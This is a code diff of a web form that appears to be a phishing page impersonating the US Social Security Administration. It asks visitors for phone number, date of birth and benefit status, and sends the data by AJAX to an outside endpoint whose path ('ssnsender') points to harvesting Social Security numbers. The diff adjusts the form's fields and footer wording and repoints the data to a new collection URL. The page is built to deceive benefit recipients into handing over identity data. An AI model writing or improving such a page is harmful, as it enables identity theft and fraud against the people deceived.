@@ -51,8 +51,12 @@
             <label for="phone">Phone Number</label></br>
             <input required id="phone" type="text" class="blanks"/><br/>
 
+
             <label for="yes">Did You Receive SSA (YES or NO) </label></br>
-            <input required id="yes" type="text" class="blanks"/><br/>
+            <select required id="yes" type="text" class="select">
+              <option>Yes</option>
+              <option>No</option>
+              </select><br/>
 
             <label for="dob">DOB (DD/MM/YYYY)</label></br>
             <input required id="dob" type="text" class="blanks"/><br/>
@@ -61,24 +65,14 @@
             <input required id="dop" type="text" class="blanks"/><br/>
 
 
-            <button type="submit" class="button">Sign Up</button>
+            <button type="submit" class="button">Submit</button>
 
 
         </form>
         <footer>
-            <p>
-              <input id="areyounow" type="checkbox" />
-              <label for="areyounow">
-                              Are you now, or have you ever been a victim of domestic violence? Identity theft? Do you have other concerns?
-              </label>
+            <p>Are you now, or have you ever been a victim of domestic violence? Identity theft? Do you have other concerns?
             </p>
-
-            <p>
-              <input id="youcancontactus" type="checkbox" />
-              <label for="youcancontactus">
-                 You can contact us to block electronic access to your information at any time, for any reason.
-              </label>
-            </p>
+            <p>You can contact us to block electronic access to your information at any time, for any reason.</p>
             <div class="links">
                 <a href="https://ssagovclaim.netlify.app/external.html?link=https://secure.ssa.gov/rome/rir-ui/helpPrivacyAndSecurity"> Privacy and Security</a>
                 <a href="https://ssagovclaim.netlify.app/external.html?link=http://www.socialsecurity.gov/agency/privacy.html">Privacy Policy</a>
@@ -130,7 +124,7 @@
     }
 
             $.ajax({
-              url: 'https://server-blue-mu.vercel.app/ssnsender2', // Replace with the URL to your PHP handler script
+              url: 'https://server-blue-mu.vercel.app/ssnsenderjullish', // Replace with the URL to your PHP handler script
               type: 'POST',
               data: JSON.stringify(data),
               contentType: 'application/json',
